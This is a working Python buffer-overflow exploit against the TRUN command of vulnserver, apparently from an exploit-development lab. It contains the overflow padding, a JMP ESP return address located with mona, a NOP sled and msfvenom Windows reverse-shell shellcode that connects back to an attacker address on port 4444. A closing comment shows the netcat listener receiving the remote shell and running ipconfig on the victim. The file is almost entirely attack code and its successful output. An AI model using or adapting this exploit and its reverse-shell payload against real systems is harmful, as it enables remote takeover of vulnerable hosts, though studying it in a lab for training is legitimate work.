#!/usr/bin/python
import socket
server = '192.168.1.19'
sport = 9999

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
connect = s.connect((server, sport))
print s.recv(1024)

prefix = 'A' * 2006

# !mona find -s "\xff\xe4" -m essfunc.dll
# OR
# !mona jump -r esp -m essfunc.dll
eip = '\xaf\x11\x50\x62'

nopsled = '\x90' * 16

# msfvenom -p windows/shell_reverse_tcp LHOST="192.168.1.20" LPORT=4444 -f c -a x86 -b '\x00'
payload = ("\xbe\x04\x35\xe7\x0e\xda\xd0\xd9\x74\x24\xf4\x5f\x33\xc9\xb1"
"\x52\x31\x77\x12\x83\xc7\x04\x03\x73\x3b\x05\xfb\x87\xab\x4b"
"\x04\x77\x2c\x2c\x8c\x92\x1d\x6c\xea\xd7\x0e\x5c\x78\xb5\xa2"
"\x17\x2c\x2d\x30\x55\xf9\x42\xf1\xd0\xdf\x6d\x02\x48\x23\xec"
"\x80\x93\x70\xce\xb9\x5b\x85\x0f\xfd\x86\x64\x5d\x56\xcc\xdb"
"\x71\xd3\x98\xe7\xfa\xaf\x0d\x60\x1f\x67\x2f\x41\x8e\xf3\x76"
"\x41\x31\xd7\x02\xc8\x29\x34\x2e\x82\xc2\x8e\xc4\x15\x02\xdf"
"\x25\xb9\x6b\xef\xd7\xc3\xac\xc8\x07\xb6\xc4\x2a\xb5\xc1\x13"
"\x50\x61\x47\x87\xf2\xe2\xff\x63\x02\x26\x99\xe0\x08\x83\xed"
"\xae\x0c\x12\x21\xc5\x29\x9f\xc4\x09\xb8\xdb\xe2\x8d\xe0\xb8"
"\x8b\x94\x4c\x6e\xb3\xc6\x2e\xcf\x11\x8d\xc3\x04\x28\xcc\x8b"
"\xe9\x01\xee\x4b\x66\x11\x9d\x79\x29\x89\x09\x32\xa2\x17\xce"
"\x35\x99\xe0\x40\xc8\x22\x11\x49\x0f\x76\x41\xe1\xa6\xf7\x0a"
"\xf1\x47\x22\x9c\xa1\xe7\x9d\x5d\x11\x48\x4e\x36\x7b\x47\xb1"
"\x26\x84\x8d\xda\xcd\x7f\x46\x25\xb9\x7e\x82\xcd\xb8\x80\xbb"
"\x51\x34\x66\xd1\x79\x10\x31\x4e\xe3\x39\xc9\xef\xec\x97\xb4"
"\x30\x66\x14\x49\xfe\x8f\x51\x59\x97\x7f\x2c\x03\x3e\x7f\x9a"
"\x2b\xdc\x12\x41\xab\xab\x0e\xde\xfc\xfc\xe1\x17\x68\x11\x5b"
"\x8e\x8e\xe8\x3d\xe9\x0a\x37\xfe\xf4\x93\xba\xba\xd2\x83\x02"
"\x42\x5f\xf7\xda\x15\x09\xa1\x9c\xcf\xfb\x1b\x77\xa3\x55\xcb"
"\x0e\x8f\x65\x8d\x0e\xda\x13\x71\xbe\xb3\x65\x8e\x0f\x54\x62"
"\xf7\x6d\xc4\x8d\x22\x36\xf4\xc7\x6e\x1f\x9d\x81\xfb\x1d\xc0"
"\x31\xd6\x62\xfd\xb1\xd2\x1a\xfa\xaa\x97\x1f\x46\x6d\x44\x52"
"\xd7\x18\x6a\xc1\xd8\x08")

attack = prefix + eip + nopsled + payload + 'C' * (3000-2006-4-len(payload)-len(nopsled))

s.send(('TRUN .' + attack + '\r\n'))

print s.recv(1024)
s.send('EXIT\r\n')
print s.recv(1024)
s.close()


"""
root@kali:~# nc -lvp 4444
listening on [any] 4444 ...
192.168.1.19: inverse host lookup failed: Unknown host
connect to [192.168.1.20] from (UNKNOWN) [192.168.1.19] 49348
Microsoft Windows [Version 6.1.7600]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\Windows7-64\Downloads\vulnserver>ipconfig
ipconfig

Windows IP Configuration


Ethernet adapter Local Area Connection:

   Connection-specific DNS Suffix  . :
   Link-local IPv6 Address . . . . . : fe80::4dc:1bc7:3581:e810%11
   IPv4 Address. . . . . . . . . . . : 192.168.1.19
   Subnet Mask . . . . . . . . . . . : 255.255.255.0
   Default Gateway . . . . . . . . . : 192.168.1.1

Tunnel adapter isatap.{9D9B5AC4-79F8-4DDB-A94B-737431590D11}:

   Media State . . . . . . . . . . . : Media disconnected
   Connection-specific DNS Suffix  . :

Tunnel adapter Local Area Connection* 11:

   Connection-specific DNS Suffix  . :
   IPv6 Address. . . . . . . . . . . : 2001:0:9d38:90d7:3025:e58:3f57:feec
   Link-local IPv6 Address . . . . . : fe80::3025:e58:3f57:feec%13
   Default Gateway . . . . . . . . . : ::

C:\Users\Windows7-64\Downloads\vulnserver>
"""
